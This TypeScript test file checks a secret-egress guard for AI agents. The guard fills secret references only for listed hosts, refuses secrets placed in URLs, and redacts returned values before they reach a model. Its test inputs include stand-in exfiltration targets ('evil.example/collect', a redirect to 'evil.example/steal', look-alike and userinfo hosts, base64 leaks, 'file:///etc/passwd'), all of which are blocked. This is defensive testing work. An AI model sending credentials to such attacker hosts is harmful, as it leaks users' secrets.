// The egress fill (design-build-plan §2.14, T4-2): `{{ secret.name }}` is
// filled at egress only, only for a destination on the secret's *Sent only
// to* list; a secret in a URL is flagged; values are redacted on the way back.
// Every Keychain here is `memoryKeychain()`, and every network call is a fake
// `fetch` that records what it was handed — which is what the assertions read.
//
// Bold (the ticket's own): **an unlisted host is blocked** and **a model body
// never contains a value**.
import { describe, expect, it } from "vitest";
import {
  EgressRefused,
  InstanceSecrets,
  SECRET_USE_META_KEY,
  SecretRedactor,
  egressDestination,
  guardedFetch,
  memoryKeychain,
  parseSecretsFile,
  planEgress,
  recordSecretUse,
  redactedSecret,
  secretRefsIn,
  type KeychainBackend,
  type RunExecutor,
  type SecretEgressPolicy,
} from "../src/index.js";

const ID = "11111111-2222-4333-8444-555555555555";
const GH = "ghp_SENTINEL-github-value-0001";
const OR = "sk-or-SENTINEL-provider-key-0002";
const LOCAL = "local-bridge-SENTINEL-0003";
const QUOTED = 'tok"en\\with/specials SENTINEL 0004';
const ORPHAN = "orphan-SENTINEL-no-policy-0005";
const VALUES = [GH, OR, LOCAL, QUOTED, ORPHAN];

const FILE = parseSecretsFile(`
secrets:
  github_write:
    hosts: [api.github.com]
    grants:
      connection:github: on
      agent:devin: ask
      agent:assistant: off
  openrouter_key:
    hosts: [openrouter.ai]
    grants:
      agent:assistant: on
  local_bridge:
    hosts: ["127.0.0.1:7812"]
    grants:
      connection:local: on
  plain_http:
    hosts: ["example.test:80"]
    grants:
      connection:legacy: on
  quoted:
    hosts: [api.github.com]
    grants:
      connection:github: on
  unset_item:
    hosts: [api.github.com]
    grants:
      connection:github: on
`);

interface Sent {
  url: string;
  init: RequestInit;
}

async function setup(opts: { respond?: (url: string, init: RequestInit) => Response | Promise<Response> } = {}) {
  const kc = memoryKeychain();
  const secrets = new InstanceSecrets(kc, ID);
  await secrets.set("github_write", GH);
  await secrets.set("openrouter_key", OR);
  await secrets.set("local_bridge", LOCAL);
  await secrets.set("plain_http", "plain-http-SENTINEL-0006");
  await secrets.set("quoted", QUOTED);
  await secrets.set("orphan", ORPHAN); // in the Keychain, but secrets.yaml says nothing about it
  const reads: string[] = [];
  const spied: KeychainBackend = { ...kc, get: async (s, a) => (reads.push(s), kc.get(s, a)) };
  const source = new InstanceSecrets(spied, ID);
  const sent: Sent[] = [];
  const fetchFn = (async (url: string, init: RequestInit = {}) => {
    sent.push({ url: String(url), init });
    return opts.respond ? opts.respond(String(url), init) : new Response("ok", { status: 200 });
  }) as typeof fetch;
  const redactor = new SecretRedactor();
  const uses: Array<{ names: string[]; destination: string }> = [];
  const door = (grantee: string, purpose: SecretEgressPolicy["purpose"], extra: Partial<SecretEgressPolicy> = {}) =>
    guardedFetch({ secrets: FILE, source, grantee, purpose, redactor, onUse: (u) => void uses.push(u), ...extra }, fetchFn);
  return { secrets, source, reads, sent, redactor, uses, door, fetchFn };
}

async function refusal(p: Promise<unknown>): Promise<EgressRefused> {
  const err = await p.then(
    () => undefined,
    (e: unknown) => e,
  );
  expect(err).toBeInstanceOf(EgressRefused);
  return err as EgressRefused;
}

/** Everything a fake network saw, as one string — what "never contains a value" is asserted over. */
function wire(sent: Sent[]): string {
  return sent.map((s) => `${s.url}\n${JSON.stringify(s.init.headers ?? {})}\n${typeof s.init.body === "string" ? s.init.body : ""}`).join("\n---\n");
}

const bearer = { authorization: "Bearer {{ secret.github_write }}" };

describe("the fill: filled at egress, for a listed host", () => {
  it("a granted secret is filled into a header for its listed host, and the names are reported", async () => {
    const t = await setup();
    const res = await t.door("connection:github", "service")("https://api.github.com/user", { headers: bearer });
    expect(res.status).toBe(200);
    expect(t.sent).toHaveLength(1);
    expect((t.sent[0]!.init.headers as Record<string, string>).authorization).toBe(`Bearer ${GH}`);
    expect(t.sent[0]!.init.redirect).toBe("manual");
    expect(t.uses).toEqual([{ names: ["github_write"], destination: "api.github.com" }]);
  });

  it("fills a body for a service call, and leaves a call with no secret alone", async () => {
    const t = await setup();
    const door = t.door("connection:github", "service");
    await door("https://api.github.com/graphql", { method: "POST", body: '{"token":"{{ secret.github_write }}"}' });
    expect(t.sent[0]!.init.body).toBe(`{"token":"${GH}"}`);
    await door("https://api.github.com/zen", {});
    expect(t.sent[1]!.init.redirect).toBeUndefined();
    expect(t.uses).toHaveLength(1);
  });

  it("loopback over http is a destination like any other — with its port listed", async () => {
    const t = await setup();
    await t.door("connection:local", "service")("http://127.0.0.1:7812/check", { headers: { authorization: "Bearer {{ secret.local_bridge }}" } });
    expect((t.sent[0]!.init.headers as Record<string, string>).authorization).toBe(`Bearer ${LOCAL}`);
  });

  it("a Request object is inspected the same way", async () => {
    const t = await setup();
    await t.door("connection:github", "service")(new Request("https://api.github.com/user", { headers: bearer }));
    expect((t.sent[0]!.init.headers as Record<string, string>).authorization).toBe(`Bearer ${GH}`);
  });
});

describe("**an unlisted host is blocked**", () => {
  const unlisted = [
    "https://evil.example/collect",
    "https://api.github.com.evil.test/user", // a look-alike suffix
    "https://evil-api.github.com/user", // a sibling name
    "https://api.github.com:8443/user", // the listed host on another port
    "https://api.github.com./user", // the trailing-dot spelling
    "https://140.82.112.6/user", // the listed host's address, not its name
    "http://localhost:7812/check", // loopback, but not the spelling listed
  ];

  for (const url of unlisted) {
    it(`${url}: refused before the Keychain is read or a byte is sent`, async () => {
      const t = await setup();
      const err = await refusal(t.door("connection:github", "service")(url, { headers: bearer }));
      expect(err.code).toBe("host_not_listed");
      expect(err.names).toEqual(["github_write"]);
      expect(t.sent).toHaveLength(0);
      expect(t.reads).toEqual([]);
      expect(t.uses).toEqual([]);
      expect(err.message).not.toContain(GH);
    });
  }

  it("a secret secrets.yaml does not describe is listed for nowhere", async () => {
    const t = await setup();
    const err = await refusal(t.door("connection:github", "service")("https://api.github.com/user", { headers: { authorization: "Bearer {{ secret.orphan }}" } }));
    expect(err.code).toBe("host_not_listed");
    expect(err.names).toEqual(["orphan"]);
    expect(t.sent).toHaveLength(0);
  });

  it("a value already in the request — not a reference — is the same secret, and is blocked the same way", async () => {
    const t = await setup();
    t.redactor.learn("github_write", GH);
    const err = await refusal(t.door("connection:github", "service")("https://evil.example/", { method: "POST", headers: { "x-token": GH } }));
    expect(err.code).toBe("host_not_listed");
    expect(t.sent).toHaveLength(0);
    const body = await refusal(t.door("connection:github", "service")("https://evil.example/", { method: "POST", body: `{"t":"${GH}"}` }));
    expect(body.code).toBe("host_not_listed");
    expect(t.sent).toHaveLength(0);
  });

  it("one unlisted secret refuses the whole call, even when the other is listed", async () => {
    const t = await setup();
    const err = await refusal(
      t.door("connection:github", "service")("https://api.github.com/user", { headers: { ...bearer, "x-extra": "{{ secret.openrouter_key }}" } }),
    );
    expect(err.code).toBe("host_not_listed");
    expect(err.names).toEqual(["openrouter_key"]);
    expect(t.sent).toHaveLength(0);
  });

  it("a redirect is not followed with the value: the 3xx comes back to the caller", async () => {
    const t = await setup({ respond: () => new Response(null, { status: 302, headers: { location: "https://evil.example/steal" } }) });
    const res = await t.door("connection:github", "service")("https://api.github.com/user", { headers: bearer, redirect: "follow" });
    expect(res.status).toBe(302);
    expect(t.sent).toHaveLength(1);
    expect(t.sent[0]!.init.redirect).toBe("manual");
  });

  it("a secret over plain http to anything off this machine is refused, even when listed", async () => {
    const t = await setup();
    const err = await refusal(t.door("connection:legacy", "service")("http://example.test/api", { headers: { authorization: "{{ secret.plain_http }}" } }));
    expect(err.code).toBe("cleartext");
    expect(t.sent).toHaveLength(0);
  });
});

describe("a secret in a URL is flagged", () => {
  const cases: Array<[string, string, (t: Awaited<ReturnType<typeof setup>>) => void]> = [
    ["a reference in the query", "https://api.github.com/user?access_token={{ secret.github_write }}", () => undefined],
    ["an encoded reference", "https://api.github.com/user?t=%7B%7B%20secret.github_write%20%7D%7D", () => undefined],
    ["a known value in the path", `https://api.github.com/u/${GH}`, (t) => t.redactor.learn("github_write", GH)],
    ["a known value, URL-encoded", `https://api.github.com/?q=${encodeURIComponent(QUOTED)}`, (t) => t.redactor.learn("quoted", QUOTED)],
    ["userinfo", "https://user:pass@api.github.com/", () => undefined],
    ["the userinfo look-alike", "https://api.github.com@evil.example/", () => undefined],
  ];
  for (const [what, url, prime] of cases) {
    it(`${what}: refused, nothing sent`, async () => {
      const t = await setup();
      prime(t);
      const err = await refusal(t.door("connection:github", "service")(url, { headers: bearer }));
      expect(err.code).toBe("secret_in_url");
      expect(t.sent).toHaveLength(0);
      for (const v of VALUES) expect(err.message).not.toContain(v);
    });
  }
});

describe("**a model body never contains a value**", () => {
  const model = "https://openrouter.ai/api/v1/chat/completions";
  const providerKey = { authorization: "Bearer {{ secret.openrouter_key }}" };
  const chat = (content: string) => JSON.stringify({ model: "m", messages: [{ role: "user", content }] });

  it("the provider key goes in the header, and the body carries none", async () => {
    const t = await setup();
    await t.door("agent:assistant", "model")(model, { method: "POST", headers: providerKey, body: chat("hello") });
    expect((t.sent[0]!.init.headers as Record<string, string>).authorization).toBe(`Bearer ${OR}`);
    expect(t.sent[0]!.init.body).not.toContain(OR);
  });

  it("a reference in a model body is refused — even one the provider's host is listed for", async () => {
    const t = await setup();
    const err = await refusal(t.door("agent:assistant", "model")(model, { method: "POST", headers: providerKey, body: chat("{{ secret.openrouter_key }}") }));
    expect(err.code).toBe("secret_in_model_body");
    expect(t.sent).toHaveLength(0);
  });

  it("a value that came back from a connection reaches the model as its name, never itself", async () => {
    // a service echoes the token it was sent — in plain text, in JSON-escaped form, in a header
    const t = await setup({
      respond: (url, init) =>
        url.startsWith("https://api.github.com")
          ? new Response(JSON.stringify({ echo: (init.headers as Record<string, string>)["x-quoted"], auth: (init.headers as Record<string, string>).authorization }), {
              headers: { "x-echo": (init.headers as Record<string, string>).authorization! },
            })
          : new Response("{}"),
    });
    const res = await t.door("connection:github", "service")("https://api.github.com/user", { headers: { ...bearer, "x-quoted": "{{ secret.quoted }}" } });
    const text = await res.text();
    expect(text).not.toContain(GH);
    expect(text).not.toContain(JSON.stringify(QUOTED).slice(1, -1));
    expect(text).toContain(redactedSecret("github_write"));
    expect(text).toContain(redactedSecret("quoted"));
    expect(res.headers.get("x-echo")).toBe(`Bearer ${redactedSecret("github_write")}`);

    // … and that text becomes the model's context
    await t.door("agent:assistant", "model")(model, { method: "POST", headers: providerKey, body: chat(`the tool said: ${text}`) });
    const modelBodies = t.sent.filter((s) => s.url === model).map((s) => String(s.init.body));
    expect(modelBodies).toHaveLength(1);
    for (const v of VALUES) for (const b of modelBodies) expect(b).not.toContain(v);
    // the marker is a name, not a reference: nothing will ever fill it again
    expect(secretRefsIn(modelBodies[0]!).names).toEqual([]);
  });

  it("a value that reached the context some other way (a note) is refused in any spelling", async () => {
    const t = await setup();
    await t.redactor.prime(Object.keys(FILE.secrets), t.source);
    const door = t.door("agent:assistant", "model");
    // QUOTED goes on the wire JSON-escaped (the body is JSON); the base64 form is a header-style reflection
    for (const leak of [GH, QUOTED, Buffer.from(GH).toString("base64")]) {
      const err = await refusal(door(model, { method: "POST", headers: providerKey, body: chat(`from a note: ${leak}`) }));
      expect(err.code).toBe("secret_in_model_body");
      expect(err.message).not.toContain(leak);
    }
    expect(t.sent).toHaveLength(0);
  });

  it("a model body the door cannot read is not sent", async () => {
    const t = await setup();
    const stream = new ReadableStream({ start: (c) => (c.enqueue(new TextEncoder().encode(GH)), c.close()) });
    const err = await refusal(t.door("agent:assistant", "model")(model, { method: "POST", headers: providerKey, body: stream, duplex: "half" } as RequestInit));
    expect(err.code).toBe("uninspectable_body");
    expect(t.sent).toHaveLength(0);
  });

  it("across every call in this file's model path, the wire never carried a value in a body", async () => {
    const t = await setup({ respond: (_u, init) => new Response(String(init.body ?? "")) });
    const door = t.door("agent:assistant", "model");
    await door(model, { method: "POST", headers: providerKey, body: chat("plain") });
    await t.door("connection:github", "service")("https://api.github.com/x", { headers: bearer }).then((r) => r.text());
    await door(model, { method: "POST", headers: providerKey, body: chat(`again ${GH}`) }).catch(() => undefined);
    const bodies = t.sent.filter((s) => s.url === model).map((s) => String(s.init.body));
    expect(bodies).toHaveLength(1);
    for (const v of VALUES) expect(bodies.join("\n")).not.toContain(v);
  });
});

describe("who may use it", () => {
  it("Off refuses; a grantee the file does not name is Off", async () => {
    const t = await setup();
    const off = await refusal(t.door("agent:assistant", "service")("https://api.github.com/", { headers: bearer }));
    expect(off.code).toBe("not_granted");
    const unnamed = await refusal(t.door("connection:other", "service")("https://api.github.com/", { headers: bearer }));
    expect(unnamed.code).toBe("not_granted");
    expect(t.sent).toHaveLength(0);
  });

  it("Ask refuses without the owner's approval of this call, and fills with it", async () => {
    const t = await setup();
    const err = await refusal(t.door("agent:devin", "service")("https://api.github.com/", { headers: bearer }));
    expect(err.code).toBe("needs_approval");
    expect(t.sent).toHaveLength(0);
    await t.door("agent:devin", "service", { approved: ["github_write"] })("https://api.github.com/", { headers: bearer });
    expect(t.sent).toHaveLength(1);
  });

  it("a grantee that is not one is a programming error, not a call", async () => {
    const t = await setup();
    await expect(t.door("github", "service")("https://api.github.com/", { headers: bearer })).rejects.toThrow(/not a grantee/);
    expect(t.sent).toHaveLength(0);
  });
});

describe("all or nothing", () => {
  it("a listed, granted secret with no item in this instance is refused, and nothing is sent", async () => {
    const t = await setup();
    const err = await refusal(t.door("connection:github", "service")("https://api.github.com/", { headers: { ...bearer, "x-other": "{{ secret.unset_item }}" } }));
    expect(err.code).toBe("missing_secret");
    expect(err.names).toEqual(["unset_item"]);
    expect(t.sent).toHaveLength(0);
    expect(t.uses).toEqual([]);
  });

  it("a malformed reference is refused, never sent as literal braces", async () => {
    const t = await setup();
    const err = await refusal(t.door("connection:github", "service")("https://api.github.com/", { headers: { authorization: "Bearer {{ secret.GitHub }}" } }));
    expect(err.code).toBe("malformed_reference");
    expect(t.sent).toHaveLength(0);
  });

  it("an address that is not http(s) is refused", async () => {
    const t = await setup();
    for (const url of ["ftp://api.github.com/", "not a url", "file:///etc/passwd"]) {
      expect((await refusal(t.door("connection:github", "service")(url, { headers: bearer }))).code).toBe("bad_url");
    }
  });
});

describe("redacted on the way back", () => {
  it("a value split across two chunks of a streamed response is still redacted", async () => {
    const half = Math.floor(GH.length / 2);
    const t = await setup({
      respond: () =>
        new Response(
          new ReadableStream({
            start(c) {
              const enc = new TextEncoder();
              c.enqueue(enc.encode(`data: {"t":"${GH.slice(0, half)}`));
              c.enqueue(enc.encode(`${GH.slice(half)}"}\n\n`));
              c.close();
            },
          }),
          { headers: { "content-type": "text/event-stream", "content-length": "999" } },
        ),
    });
    const res = await t.door("connection:github", "service")("https://api.github.com/stream", { headers: bearer });
    const text = await res.text();
    expect(text).toBe(`data: {"t":"${redactedSecret("github_write")}"}\n\n`);
    expect(res.headers.get("content-length")).toBeNull();
  });

  it("an error from the network comes back with the value replaced by its name, and no cause", async () => {
    const t = await setup();
    const door = guardedFetch(
      {
        secrets: FILE,
        source: t.source,
        grantee: "connection:github",
        purpose: "service",
        redactor: t.redactor,
        onUse: (u) => void t.uses.push(u),
      },
      (async (_u: string, init: RequestInit) => {
        const e = new Error(`connect failed while sending ${(init.headers as Record<string, string>).authorization}`, { cause: { init } });
        throw e;
      }) as unknown as typeof fetch,
    );
    const err = (await door("https://api.github.com/", { headers: bearer }).catch((e: unknown) => e)) as Error;
    expect(err.message).not.toContain(GH);
    expect(err.message).toContain(redactedSecret("github_write"));
    expect(err.cause).toBeUndefined();
    // the value WAS on the wire, so the use is recorded
    expect(t.uses).toEqual([{ names: ["github_write"], destination: "api.github.com" }]);
  });

  it("a null-body status passes through", async () => {
    const t = await setup({ respond: () => new Response(null, { status: 204 }) });
    const res = await t.door("connection:github", "service")("https://api.github.com/", { headers: bearer });
    expect(res.status).toBe(204);
  });
});

describe("planEgress — the checks, without the store", () => {
  it("names what a call would send and to where, and reads no value", async () => {
    const t = await setup();
    const plan = planEgress({ url: "https://api.github.com/user", headers: bearer }, { secrets: FILE, grantee: "connection:github", purpose: "service", redactor: t.redactor });
    expect(plan.destination.entry).toBe("api.github.com");
    expect(plan.names).toEqual(["github_write"]);
    expect(t.reads).toEqual([]);
  });

  it("egressDestination spells a destination the way hosts: does", () => {
    expect(egressDestination("https://API.GitHub.com/x")?.entry).toBe("api.github.com");
    expect(egressDestination("https://h.example:8443/")?.entry).toBe("h.example:8443");
    expect(egressDestination("http://127.0.0.1:7812/")).toMatchObject({ entry: "127.0.0.1:7812", cleartext: false });
    expect(egressDestination("http://example.test/")).toMatchObject({ entry: "example.test:80", cleartext: true });
    expect(egressDestination("http://[::1]:9/")?.entry).toBe("[::1]:9");
    expect(egressDestination("mailto:x@y")).toBeUndefined();
  });
});

describe("recordSecretUse — *last used* is stamped on the run", () => {
  it("merges the names into runs.meta.secrets as a set, and does nothing for none", async () => {
    const calls: Array<{ text: string; values: unknown[] }> = [];
    const db: RunExecutor = { query: async (text, values) => (calls.push({ text, values }), { rows: [] }) };
    await recordSecretUse(db, 42, ["github_write"]);
    await recordSecretUse(db, 42, []);
    expect(calls).toHaveLength(1);
    expect(calls[0]!.values).toEqual([42, JSON.stringify(["github_write"]), SECRET_USE_META_KEY]);
    expect(calls[0]!.text).toMatch(/UPDATE runs SET meta = jsonb_set/);
  });
});
